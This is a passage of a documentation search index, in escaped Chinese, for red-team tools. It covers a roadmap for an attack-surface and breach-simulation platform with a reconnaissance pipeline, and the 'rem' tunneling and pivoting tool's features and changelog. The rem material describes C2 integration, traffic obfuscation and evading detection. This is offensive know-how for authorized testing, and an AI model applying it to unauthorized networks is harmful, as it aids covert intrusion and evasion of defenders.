\u4ee3\u8868\u80fd\u529b\u8fb9\u754c\u3002\u5982\u679c\u662f\u5916\u90e8\u7684\u81ea\u52a8\u5316\u6d4b\u7ed8\u7684\u573a\u666f\uff0c \u76ee\u524d\u7684\u80fd\u529b\u5df2\u7ecf\u8db3\u591f\u8986\u76d6\u7edd\u5927\u591a\u6570\u573a\u666f\u3002 \u5982\u679c\u8981\u6210\u4e3aCTEM\uff0c \u90a3\u8fd8\u4e0d\u591f\uff0c \u6211\u4eec\u8fd8\u9700\u8981\u62d3\u5c55\u5927\u6a21\u578b\uff0c\u79fb\u52a8\u7aef\uff0c IoT\u7b49\u573a\u666f\u7684\u80fd\u529b\u3002 </p> <p>\u6bcf\u4e2aCapability\u5c06\u6709\u4e00\u7ec4\u80fd\u529b\uff0c\u4ee3\u8868\u5404\u4e2a\u7ec6\u5206\u9886\u57df\uff0c Ability \u8868\u793a\u5143\u80fd\u529b\uff0c \u662f\u80fd\u529b\u7684\u6700\u5c0f\u5355\u4f4d\u3002 </p> <p>task\u662f\u5bf9Ability\u7684\u81ea\u52a8\u5c01\u88c5\uff0c \u6bcf\u4e2aAbility\u90fd\u4f1a\u6709\u81f3\u5c11\u4e00\u4e2atask\u3002 flow\u662f\u5bf9\u591a\u4e2atask\u7684\u7f16\u6392\u3002\u53ef\u4ee5\u57fa\u4e8eyaml\u8fdb\u884c\u7f16\u6392\u3002 </p> <p>\u5728\u4e0b\u9762\u7684\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c \u6211\u4eec\u9700\u8981\u5904\u7406\u975e\u5e38\u590d\u6742\u7684\u6570\u636e\u683c\u5f0f\u3002 </p> <pre><code>name: \"subfinder_dnsx_httpx_pipeline\"  \ndescription: \"\u5b8c\u6574\u7684\u5b50\u57df\u540d\u53d1\u73b0\u5230Web\u63a2\u6d4b\u7684Pipeline\"  \n\nsteps:  \n  - name: \"subdomain_discovery\"  \n    artifact: \"subfinder\"  \n    operation: \"baseline\"  \n    input: \"${{ vars.input }}\"  \n    outputs:  \n      # \u63d0\u53d6\u6240\u6709\u6709\u6548\u57df\u540d\uff0c\u53bb\u91cd - \u4f9b\u4e0b\u4e00\u6b65\u4f7f\u7528  \n      domains: \"${{ unique([item.host for item in result if item.host]) }}\"  \n\n  - name: \"dns_resolution\"  \n    artifact: \"dnsx\"  \n    operation: \"baseline\"  \n    input: \"${{ vars.domains }}\"  \n    outputs:  \n      # \u63d0\u53d6\u6240\u6709\u89e3\u6790\u6210\u529f\u7684IP\u5730\u5740\uff0c\u9700\u8981\u5c55\u5e73\u5904\u7406  \n      resolved_ips: \"${{ jq(result, 'map(select(.a and (.a | length) &gt; 0)) | map(.a) | flatten | unique') }}\"  \n      # \u89e3\u6790\u6210\u529f\u7684\u57df\u540d\u5217\u8868 - \u4f9b\u4e0b\u4e00\u6b65\u4f7f\u7528  \n      live_domains: \"${{ [item.host for item in result if item.a and length(item.a) &gt; 0] }}\"  \n    condition: \"${{ length(vars.domains) &gt; 0 }}\"  \n\n  - name: \"web_discovery\"  \n    artifact: \"httpx\"  \n    operation: \"baseline\"  \n    input:  \n      - \"${{ vars.live_domains }}\"  \n      - ${{vars.resolved_ips}}  \n    condition: \"${{ length(vars.live_domains) &gt; 0 }}\"\n</code></pre> <p>\u96be\u70b9/\u7591\u70b9</p> <ul> <li>Capability \u9700\u8981\u7ee7\u627f\u539f\u6709BAS\u7684\u80fd\u529b\uff0c \u8fd9\u662f\u4e00\u4e2a\u8f83\u4e3a\u6f2b\u957f\u7684\u8fc7\u7a0b\u3002 \u4f46\u53ea\u8981\u4fdd\u6301\u826f\u597d\u7684\u62bd\u8c61\uff0c AI\u53ef\u4ee5\u5b9e\u73b0\u5927\u90e8\u5206\u5de5\u4f5c</li> <li>\u4e1a\u52a1\u7684\u540c\u5b66\u5b9e\u73b0\u6700\u5c0f\u5316poc\uff0c \u5c31\u4f1a\u5728\u7cfb\u7edf\u4e2d\u81ea\u52a8\u6ce8\u518c\uff0ctask\u3002 </li> <li>\u5982\u679c\u662f\u6709\u6548\u6027\u9a8c\u8bc1\uff0c \u5bf9\u6570\u636e\u7684\u8981\u6c42\u5e76\u4e0d\u9ad8\uff0c \u5f88\u591a\u60c5\u51b5\u4e0b\u53ea\u9700\u8981 true/false\u5373\u53ef\u8868\u8ff0\u3002\u53ea\u9700\u8981\u5728\u5bf9\u5e94\u7684Capability,  \u90a3\u53ea\u9700\u8981\u5b9e\u73b0\u5143\u80fd\u529b\u7684\u6700\u5c0fpoc\u3002 \u7136\u540e\u901a\u8fc7web ui\u7f16\u6392yaml\u5373\u53ef\u5b9e\u73b0\u53ef\u89c6\u5316\u7f16\u6392\u3002 </li> </ul>"},{"location":"mapping/roadmap/#\u5206\u5e03\u5f0f\u8c03\u5ea6\u5c42","title":"\u5206\u5e03\u5f0f\u8c03\u5ea6\u5c42","text":"<p>\u6bcf\u4e2aworker\u542f\u52a8\u65f6\u90fd\u4f1a\u6ce8\u518c\u6536\u53d1\u6570\u636e\u7684\u6d88\u606f\u961f\u5217\u3002\u5e76\u4e14\u544a\u77e5\u8c03\u5ea6\u5668\u81ea\u8eab\u7684\u80fd\u529b\u8fb9\u754c\u4ee5\u53ca\u6027\u80fd\u3002</p> <p>\u901a\u8fc7\u8c03\u5ea6\u5668\u7684api\u53d1\u8d77\u626b\u63cf\u4efb\u52a1\u65f6\uff0c\u4f1a\u6839\u636e\u4efb\u52a1\u7c7b\u578b \u9009\u62e9\u5408\u9002\u7684worker\uff0c \u5982\u679c\u6709\u591a\u4e2a\u540c\u7c7b\u578bworker\uff0c \u4f1a\u5c06\u4efb\u52a1\u62c6\u5206\u7ed9\u591a\u4e2aworker\u540c\u65f6\u8fdb\u884c\uff0c \u8c03\u5ea6\u5668\u8fdb\u884c\u8c03\u5ea6\u7684\u6700\u5c0f\u4efb\u52a1\u5355\u4f4d\u662fflow\u3002</p> <p>\u8c03\u5ea6\u5668\u8fd8\u5c06\u8d1f\u8d23\u6570\u636e\u7684\u6e05\u6d17\u3001\u5206\u7c7b\u3001\u5165\u5e93\u3001\u5173\u8054\u7b49\u64cd\u4f5c\u3002\u4e3a\u6570\u636e\u5c42\u63d0\u4f9b\u521d\u6b65\u5206\u6790\u540e\u7684\u6570\u636e\u3002 </p> <p>\u5267\u672c\u7f16\u6392\u5c06\u5728\u8fd9\u4e2a\u5c42\u7ea7\u5b9e\u73b0\uff0c \u4e00\u4e2a\u5267\u672c\u4e2d\uff0c \u6267\u884c\u5927\u91cf\u7684technology\uff08task\uff09\u4e0epattern\uff08flow\uff09\uff0c \u9700\u8981\u5728\u5206\u5e03\u5f0f\u8c03\u5ea6\u5668\u4e2d\u7ba1\u7406\u8fd9\u4e2a\u4efb\u52a1\uff0c \u5e76\u5c06\u5176\u4ea4\u7ed9\u5408\u9002\u7684worker\u6267\u884c\u3002 \u4f8b\u5982\u8de8\u5b89\u5168\u57df\u7684\u4efb\u52a1\uff0c \u53ef\u80fd\u9700\u8981\u4eceworker A\u63a5\u6536\u6570\u636e\uff0c \u4ea4\u7ed9worker B\u6267\u884c\u3002</p> <p>\u6216\u8005\u591a\u4e2aworker\u6765\u63d0\u9ad8\u6267\u884c\u4efb\u52a1\u7684\u6548\u7387\uff0c \u4f8b\u5982\u5916\u7f51\u63a2\u6d4b\u4efb\u52a1\u4e2d\uff0c\u53ef\u80fd\u6bcf\u4e2aworker\u7684\u5e76\u53d1\u6027\u80fd\u90fd\u572810000\u5de6\u53f3\uff0c \u9700\u8981\u591a\u4e2aworker\u6765\u63d0\u9ad8\u6548\u7387\u3002 </p> <p>\u540e\u7eed\u7684AI\u76f8\u5173\u7684\u80fd\u529b\u4e5f\u5c06\u5728\u8fd9\u4e00\u5c42\u5b9e\u73b0\u3002 </p> <p>\u6240\u6709\u7684task\u90fd\u5c06\u81ea\u52a8\u6ce8\u518c\u4e3aMCP\u4e2d\u7684tools\u3002 \u7136\u540e\u5b9e\u73b0\u4e00\u4e2aAI\u57fa\u4e8eMCP\u8c03\u7528\u4e0d\u7528\u7684tools\u5b8c\u6210\u81ea\u52a8\u5316\u7d2b\u519b\u6f14\u7ec3\u3002</p>"},{"location":"mapping/roadmap/#\u6570\u636e\u5c42","title":"\u6570\u636e\u5c42","text":"<p>\u6570\u636e\u5c42\u5206\u4e3a</p> <ul> <li>\u7f13\u5b58 redis \uff0c \u9632\u6b62\u591a\u6b21\u540c\u4e2atask\u591a\u6b21\u6267\u884c\u91cd\u590d\u5de5\u4f5c\u3002</li> <li>\u6570\u4ed3 postgre/ods\uff0c\u4fdd\u5b58\u6bcf\u4e2atask\u7684\u539f\u59cb\u6570\u636e\u3002 <ul> <li>workflow \u8c03\u5ea6\u6570\u636e</li> <li>\u6bcf\u4e2atask\u7684\u539f\u59cb\u6570\u636e</li> <li>\u57fa\u4e8e\u7b2c\u4e09\u65b9\u6570\u636e\u7684\u7b5b\u9009\u540e\u5143\u6570\u636e</li> <li>\u56fe\u6570\u636e\u5e93\u4e2d\u7684node\u4e0erelaship\u7684\u6620\u5c04\u6570\u636e</li> </ul> </li> <li>\u56fe\u6570\u636e\u5e93 \u5c06\u6570\u636e\u8fdb\u884c\u5173\u8054\uff0c \u4e3b\u8981\u63d0\u4f9b\u7ed9\u653b\u51fb\u9762\u5f15\u64ce\uff0c BAS\u53ef\u80fd\u53ea\u9700\u8981\u6536\u96c6\u7ed3\u679c\u3002 </li> </ul>"},{"location":"mapping/roadmap/#\u9700\u8981\u4ece\u539f\u672c\u7684bas\u4e2d\u7ee7\u627f\u7684\u80fd\u529b","title":"\u9700\u8981\u4ece\u539f\u672c\u7684BAS\u4e2d\u7ee7\u627f\u7684\u80fd\u529b","text":"<ul> <li>RPA\u76f8\u5173\uff0c RPA\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u7279\u6b8a\u7684worker</li> <li>\u5404\u79cd\u5185\u90e8\u6570\u636e\u63a5\u53e3</li> <li>\u539f\u672c\u7684\u5143\u80fd\u529b\uff0c \u539f\u672c\u57fa\u4e8eairflow\u5b9e\u73b0</li> <li>...</li> </ul>"},{"location":"rem/","title":"rem \u00b7 index","text":""},{"location":"rem/#overview","title":"overview","text":"<p>rem \u662f\u4e00\u4e2a\u89e3\u51b3\u5168\u573a\u666f\u6d41\u91cf\u64cd\u4f5c\u7684\u4e07\u80fd\u5de5\u5177, \u5c06\u63d0\u4f9b\u5168\u573a\u666f\u7684 Tunnel(\u6d41\u91cf\u96a7\u9053), Proxy(\u4ee3\u7406), Pivoting(\u8df3\u677f), Forward(\u8f6c\u53d1)\u89e3\u51b3\u65b9\u6848.</p> <p>rem \u5c06\u4f5c\u4e3a\u6240\u6709\u5de5\u5177\u7684\u96c6\u4e2d\u70b9, \u9664\u4e86\u6700\u57fa\u672c\u7684 cli \u5916, \u8fd8\u5c06\u63d0\u4f9b\u4e00\u5957 SDK \u4ee5\u4f9b\u5404\u79cd\u5de5\u5177\u4ea4\u4e92. \u7528\u6765\u6253\u901a\u5404\u79cd\u5de5\u4ef6(gogo, zombie, spray), ASM(mapping), C2(IoM)\u76f4\u63a5\u7684\u901a\u4fe1\u95ee\u9898.</p> <p>rem \u53ef\u4ee5\u8ba9\u5de5\u4ef6\u4eec\u4e0d\u843d\u5730, \u53ef\u4ee5\u8ba9 mapping \u4ece EASM \u63a5\u5165\u5230\u5185\u7f51, \u53ef\u4ee5\u8ba9 C2 \u4f7f\u7528\u5404\u79cd\u6d41\u91cf\u89c4\u907f\u4ee5\u53ca\u5b89\u5168\u7684\u4fe1\u9053\u4f20\u8f93\u6570\u636e.</p> <p>Features.</p> <ul> <li>\u5168\u5e73\u53f0\u517c\u5bb9</li> <li>\u6b63\u5411\u4ee3\u7406\u4e0e\u53cd\u5411\u4ee3\u7406</li> <li>\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1\u4e0e\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1</li> <li>\u672c\u5730\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1\u4e0e\u672c\u5730\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1(cobaltstrike\u4e2d\u7684rportfwd_local)]</li> <li>\u591a\u79cd\u534f\u8bae\u7684\u591a\u7ea7\u4ee3\u7406\u652f\u6301, socks,http,neoreg\u7b49</li> <li>\u7ea7\u8054</li> <li>\u6d41\u91cf\u7279\u5f81\u81ea\u5b9a\u4e49\u4e0e\u52a0\u5bc6\u65b9\u5f0f\u81ea\u5b9a\u4e49</li> <li>\u591a\u4fe1\u9053\u652f\u6301, udp,tcp,icmp,websocket,wireguard\u7b49</li> <li>clash\u8ba2\u9605\u652f\u6301</li> </ul>"},{"location":"rem/#release","title":"release","text":"<p>community: https://github.com/chainreactors/rem-community </p> <p>community \u5728\u4e3b\u4f53\u529f\u80fd\u4e0a\u4e0eprofessional\u5b8c\u5168\u4e00\u81f4, \u4ec5\u5728\u5bf9\u6297\u4e0a\u6709\u533a\u522b</p> <p>professional: https://github.com/chainreactors/rem/ (\u4e0d\u5bf9\u5916\u5f00\u653e\uff0c\u63a5\u53d7\u5b9a\u5236\u5316\u5f00\u53d1)</p> <p>professinal feature:</p> <p>Features.</p> <ul> <li>\u5bc6\u7801\u5b66\u524d\u5411\u4e0e\u540e\u5411\u5b89\u5168</li> <li>\u4e0a\u884c\u6d41\u91cf\u4e0e\u4e0b\u884c\u6d41\u91cf\u7279\u5f81\u81ea\u5b9a\u4e49</li> <li>tls\u7279\u6027: shadowtls, utls, reality </li> <li>lolc2</li> </ul>"},{"location":"rem/changelog/","title":"Changelog","text":""},{"location":"rem/changelog/#roadmap","title":"roadmap","text":""},{"location":"rem/changelog/#stage-0","title":"stage 0","text":"<ul> <li> \u6b63\u5411\u7aef\u53e3\u8f6c\u53d1, \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u8f6c\u53d1\u5230\u8fdc\u7a0b</li> <li> \u53cd\u5411\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u8fdc\u7a0b\u8f6c\u53d1\u5230\u672c\u673a</li> <li> \u6b63\u5411\u4ee3\u7406, \u642d\u5efasocks5/http\u4ee3\u7406</li> <li> \u53cd\u5411\u4ee3\u7406, \u901a\u8fc7\u670d\u52a1\u5668, \u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u5ba2\u6237\u7aef. (rem\u4e2d\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4e00\u5b9a\u6709\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u4e4b\u5206, rem\u4e2d\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u4efb\u610f\u8282\u70b9)</li> <li> \u4ee3\u7406, \u901a\u8fc7\u5176\u4ed6\u670d\u52a1\u63d0\u4f9b\u7684\u4ee3\u7406\u534f\u8bae, \u4f8b\u5982socks5/http\u4ee3\u7406, \u8f6c\u53d1rem\u534f\u8bae\u672c\u8eab\u7684\u6d41\u91cf</li> <li> \u8f6c\u53d1, \u901a\u8fc7\u5176\u4ed6\u670d\u52a1\u63d0\u4f9b\u7684\u4ee3\u7406\u534f\u8bae, \u5c06\u51fa\u65b9\u5411\u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u6307\u5b9a\u76ee\u6807</li> <li> \u7ea7\u8054, \u80fd\u901a\u8fc7rem\u81ea\u8eab\u7684\u534f\u8bae, \u5f62\u6210\u591a\u7ea7\u7684\u8282\u70b9\u7684\u8fde\u63a5\u5173\u7cfb</li> <li> \u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li> \u591a\u7ea7\u4ee3\u7406\u8f6c\u53d1, \u5c06\u6d41\u91cf\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li> RPORTFWD_LOCAL, (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06\u672c\u673a\u7684\u7684\u7aef\u53e3\u901a\u8fc7rem\u8f6c\u53d1\u81f3</li> <li> PORTFWD_LOCAL,  (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06rem\u8282\u70b9\u7684\u7aef\u53e3\u8f6c\u53d1\u81f3\u672c\u673a</li> </ul> <p>\u7279\u6027:</p> <ul> <li> \u4f20\u8f93\u5c42, \u652f\u6301TCP, UDP, ICMP, WIREGUARD\u7b49\u5404\u79cd\u573a\u666f\u4f20\u8f93\u5c42\u534f\u8bae</li> <li> \u52a0\u5bc6\u5c42, TLS/MTLS\u6216\u8005\u4efb\u610f\u81ea\u5b9a\u4e49\u7684\u52a0\u5bc6\u534f\u8bae</li> <li> \u6df7\u6dc6\u5c42, \u6a21\u62df\u7279\u5b9a\u534f\u8bae</li> <li> \u8fde\u63a5\u590d\u7528</li> </ul>"},{"location":"rem/changelog/#stage-1","title":"stage 1","text":"<ul> <li> \u8c03\u6574\u4e3b\u4f53\u6587\u4ef6\u7ed3\u6784</li> <li> \u8c03\u6574\u51fd\u6570,\u6587\u4ef6,\u53d8\u91cf\u547d\u540d</li> <li> \u91cd\u6784\u4ee3\u7406\u903b\u8f91</li> <li> \u4ee3\u7801\u89e3\u8026</li> <li> \u91cd\u6784monitor\u4e0e\u6d41\u91cf\u63a7\u5236</li> <li> \u91cd\u65b0\u8bbe\u8ba1cli ui</li> <li> \u652f\u6301rportfwd</li> <li> \u91cd\u65b0\u8bbe\u8ba1msg</li> <li> \u91cd\u65b0\u8bbe\u8ba1wrapper</li> <li> \u652f\u6301neoregeorg, \u5c06\u534a\u53cc\u5de5\u4fe1\u9053\u5347\u7ea7\u4e3a\u5168\u53cc\u5de5</li> <li> \u652f\u6301\u4e91\u51fd\u6570, cdn\u7b49</li> <li> \u652f\u6301\u914d\u7f6e\u4efb\u610f\u6570\u91cf\u7684\u591a\u7ea7\u900f\u660esocks5/socks4a/socks4/http/https\u4ee3\u7406</li> <li> \u652f\u6301tls\u534f\u8bae (working)</li> <li> \u652f\u6301\u7ea7\u8054 (working)</li> <li> \u652f\u6301\u7aef\u53e3\u590d\u7528(\u6401\u7f6e)</li> <li> \u652f\u6301\u7aef\u53e3\u6572\u95e8(\u6401\u7f6e)</li> <li> RPORTFWD_LOCAL\u4e0ePORTFWD_LOCAL</li> <li> \u91cd\u6784proxyclient</li> <li> \u652f\u6301clash\u8ba2\u9605</li> <li> \u652f\u6301shadow-tls</li> <li> \u652f\u6301\u5bf9\u5916\u66b4\u9732\u591a\u79cd\u7c7b\u578b\u7684\u534f\u8bae</li> <li> socks5</li> <li> http/https</li> <li> trojan</li> <li> v2ray</li> </ul> <p>\u9ad8\u7ea7\u529f\u80fd</p> <ul> <li> Proxy as a service, \u63d0\u4f9b\u4e00\u5957\u6d41\u91cf\u534f\u8bae\u6807\u51c6\u4ee5\u53ca\u591a\u8bed\u8a00\u8de8\u5e73\u53f0sdk, \u65e0\u6027\u80fd\u635f\u8017\u7684\u8f6c\u53d1\u6d41\u91cf (working)</li> <li> \u5fc3\u8df3\u4ee3\u7406, \u4f7f\u7528\u975e\u957f\u8fde\u63a5\u7684\u65b9\u5f0f\u5efa\u7acb\u4ee3\u7406, \u5b9e\u73b0\u66f4\u590d\u6742\u7684\u6d41\u91cf\u4e0e\u7edf\u8ba1\u5b66\u7279\u5f81\u6df7\u6dc6</li> <li> P2P\u5f0f\u7684\u591a\u7ea7\u4ee3\u7406, \u7c7b\u4f3cSTUN\u534f\u8bae</li> <li> \u91cd\u8f7d\u4efb\u610fC2\u7684listener, \u6700\u7ec8\u76ee\u7684\u5c06listener\u4eceC2\u4e2d\u89e3\u8026\u51fa\u6765</li> <li> \u5b9e\u73b0\u7f16\u8bd1\u671f, \u81ea\u5b9a\u4e49templates. \u5b9e\u73b0\u968f\u673a\u6d41\u91cf\u7279\u5f81\u4e0e\u6700\u5c0f\u6587\u4ef6\u4f53\u79ef</li> <li> \u901a\u8fc7ebpf\u4e0eraw packet\u5b9e\u73b0\u66f4\u9ad8\u7ea7\u7684\u4fe1\u9053\u5efa\u7acb\u4e0e\u9690\u853d</li> </ul>"},{"location":"rem/changelog/#log","title":"log","text":""},{"location":"rem/changelog/#v022","title":"v0.2.2","text":"<ul> <li>[feat] \u65b0\u589eclash config\u7684\u81ea\u52a8\u7f51\u6bb5\u914d\u7f6e</li> <li>[feat] \u65b0\u589ecobaltstrike external c2 demo</li> <li>[feat] \u65b0\u589e\u6d41\u91cf\u5168\u5c40\u538b\u7f29,\u00a0<code>-c tcp:///?compress=true</code></li> <li>[feat] \u65b0\u589etlsintls ,\u00a0<code>-c tcp:///?tlsintls=true</code></li> <li>[feat] \u65b0\u589ebuild.sh\u7684-t,-a,-o\u53c2\u6570</li> </ul>"},{"location":"rem/changelog/#v021","title":"v0.2.1","text":"<ul> <li>[feat] support cmdline from stdin</li> <li>[feat] add rem lib release, dll/so/a</li> <li>[fix] unaligned int panic</li> <li>[fix] buffer close panic</li> <li>[fix] socks5 parse ipv6 error</li> </ul>"},{"location":"rem/changelog/#v020","title":"v0.2.0","text":"<ul> <li>[feat] add cmd/export as FFI ABI</li> <li>[feat] add build.sh</li> <li>[feat] add as package api</li> <li>[fix] xor/aes wrapper bug</li> <li>[fix] cio Read not full</li> <li>[improve] refactor metrics and log</li> <li>[improve] add connect mod, just connect ,no serving.</li> </ul>"},{"location":"rem/changelog/#v011","title":"v0.1.1","text":"<ul> <li>[feature] inbound: \u652f\u6301 tcp+socks5 \u534f\u8bae\u6216memory+socks5, \u5141\u8bb8inbound\u534f\u8bae\u5728\u4e0d\u540c\u7684\u4f20\u8f93\u5c42\u4e0a\u642d\u5efa</li> <li>[feature] proxyclient: \u5b9e\u73b0\u5185\u5b58\u4ee3\u7406\u529f\u80fd</li> <li>[feature] proxyclient:\u5b9e\u73b0 rem proxyclient</li> <li>[feature] tunnel: \u5b9e\u73b0\u5185\u5b58\u901a\u9053</li> <li>[feature] kcp: \u5b9e\u73b0 KCP ICMP \u4f20\u8f93</li> <li>[feature] kcp: \u5b9e\u73b0 HTTP/ICMP KCP \u4f20\u8f93</li> <li>[feature] kcp: \u5b9e\u73b0 HTTP \u901a\u9053</li> <li>[feature] kcp: \u89e3\u8026 simplex \u548c HTTP \u4f20\u8f93</li> <li>[feature] cmd: \u6dfb\u52a0 no-sub \u6807\u5fd7\u4ee5\u7981\u7528\u8ba2\u9605\u529f\u80fd</li> <li>[refactor] kcp: \u91cd\u6784 KCP \u66ff\u6362 kicmp \u548c KCP-GO</li> <li>[refactor] tunnel: \u91cd\u6784tunnel\uff0c\u62c6\u5206\u4e3a dialer \u548c listener</li> <li>[refactor] tunnel: \u91cd\u6784agent ID \u548cbridge ID \u751f\u6210</li> <li>[enhance] proxyclient: ssh\u4ee3\u7406\u8fde\u63a5\u590d\u7528</li> <li>[enhance] tunnel: \u63d0\u5347\u7f13\u51b2\u533a\u6027\u80fd</li> <li>[fix] \u5927\u91cfbug\u4fee\u590d</li> </ul>"},{"location":"rem/changelog/#v010","title":"v0.1.0","text":"<p>\u5f7b\u5e95\u91cd\u6784</p> <ul> <li>\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1, \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u8f6c\u53d1\u5230\u8fdc\u7a0b</li> <li>\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u8fdc\u7a0b\u8f6c\u53d1\u5230\u672c\u673a</li> <li>\u6b63\u5411\u4ee3\u7406, \u642d\u5efasocks5/http\u4ee3\u7406</li> <li>\u53cd\u5411\u4ee3\u7406, \u901a\u8fc7\u670d\u52a1\u5668, \u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u5ba2\u6237\u7aef. (rem\u4e2d\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4e00\u5b9a\u6709\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u4e4b\u5206, rem\u4e2d\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u4efb\u610f\u8282\u70b9)</li> <li>\u4ee3\u7406, \u901a\u8fc7\u5176\u4ed6\u670d\u52a1\u63d0\u4f9b\u7684\u4ee3\u7406\u534f\u8bae, \u4f8b\u5982socks5/http\u4ee3\u7406, \u8f6c\u53d1rem\u534f\u8bae\u672c\u8eab\u7684\u6d41\u91cf</li> <li>\u8f6c\u53d1, \u901a\u8fc7\u5176\u4ed6\u670d\u52a1\u63d0\u4f9b\u7684\u4ee3\u7406\u534f\u8bae, \u5c06\u51fa\u65b9\u5411\u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u6307\u5b9a\u76ee\u6807</li> <li>\u7ea7\u8054, \u80fd\u901a\u8fc7rem\u81ea\u8eab\u7684\u534f\u8bae, \u5f62\u6210\u591a\u7ea7\u7684\u8282\u70b9\u7684\u8fde\u63a5\u5173\u7cfb</li> <li>\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li>\u591a\u7ea7\u4ee3\u7406\u8f6c\u53d1, \u5c06\u6d41\u91cf\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li>RPORTFWD_LOCAL, (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06\u672c\u673a\u7684\u7684\u7aef\u53e3\u901a\u8fc7rem\u8f6c\u53d1\u81f3</li> <li>PORTFWD_LOCAL,  (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06rem\u8282\u70b9\u7684\u7aef\u53e3\u8f6c\u53d1\u81f3\u672c\u673a</li> </ul> <p>\u7279\u6027:</p> <ul> <li>\u4f20\u8f93\u5c42, \u652f\u6301TCP, UDP, ICMP, WIREGUARD\u7b49\u5404\u79cd\u573a\u666f\u4f20\u8f93\u5c42\u534f\u8bae</li> <li>\u52a0\u5bc6\u5c42, TLS/MTLS\u6216\u8005\u4efb\u610f\u81ea\u5b9a\u4e49\u7684\u52a0\u5bc6\u534f\u8bae</li> <li>\u6df7\u6dc6\u5c42, \u6a21\u62df\u7279\u5b9a\u534f\u8bae</li> <li>\u8fde\u63a5\u590d\u7528</li> </ul>"},{"location":"rem/concept/","title":"\u6982\u5ff5","text":""},{"location":"rem/concept/#\u524d\u7f6e\u77e5\u8bc6","title":"\u524d\u7f6e\u77e5\u8bc6","text":""},{"location":"rem/concept/#\u4ee3\u7406","title":"\u4ee3\u7406","text":"<p>\u6307\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u76ee\u6807\u7684\u4e2d\u95f4\u670d\u52a1\u5668\u3002 \u5728\u4f20\u7edf\u610f\u4e49\u4e0a\uff0c user -&gt; proxy -&gt; target.</p> <pre><code>graph LR\n    User --&gt; Proxy\n    Proxy --&gt; Target</code></pre> <p>\u4f46\u5728 rem \u4e2d\uff0c \u8fd9\u79cd\u7b80\u5355\u6a21\u5f0f\u7684\u4ee3\u7406\u662f\u6709\u4e00\u4e2a\u522b\u7684\u540d\u5b57 bind\u3002 proxy \u6307\u7684\u662f user -&gt; client -&gt; server -&gt; target. \u6d41\u91cf\u4ece client \u53d1\u8d77\uff0c \u7ecf\u8fc7 server\uff0c \u6700\u540e\u5230 target\u3002</p> <pre><code>graph LR\n    User --&gt; Client\n    Client --&gt; Server\n    Server --&gt; Target</code></pre> <p>\u8ba9\u4f4d\u4e8e client \u7f51\u6bb5\u7684\u4f7f\u7528\u8005\uff0c \u53ef\u4ee5\u8bbf\u95ee\u5230 server \u7f51\u6bb5\u7684\u670d\u52a1\u3002</p>"},{"location":"rem/concept/#\u53cd\u5411\u4ee3\u7406","title":"\u53cd\u5411\u4ee3\u7406","text":"<p>\u53cd\u5411\u4ee3\u7406\u8868\u793a\u6d41\u91cf user -&gt; server -&gt; client -&gt; target.</p> <pre><code>graph LR\n    User --&gt; Server\n    Server --&gt; Client\n    Client --&gt; Target</code></pre> <p>\u7528\u6765\u8ba9\u4f4d\u4e8e server \u7f51\u6bb5\u7684\u670d\u52a1\uff0c \u53ef\u4ee5\u8bbf\u95ee\u5230 client \u7f51\u6bb5\u7684\u670d\u52a1\u3002</p>"},{"location":"rem/concept/#\u7aef\u53e3\u8f6c\u53d1","title":"\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u7aef\u53e3\u8f6c\u53d1\u6709\u4e24\u79cd\u65b9\u5411\uff0c \u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u4e0e\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\uff08\u6765\u81ea ssh \u7684\u547d\u540d\uff09</p> <p>\u7aef\u53e3\u8f6c\u53d1\u672c\u8d28\u4e0a\u662f\u9759\u6001\u76ee\u6807\u7684\u4ee3\u7406\uff0c \u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u8868\u793a</p>"},{"location":"rem/concept/#arq","title":"ARQ","text":"<p>ARQ (Automatic Repeat reQuest) 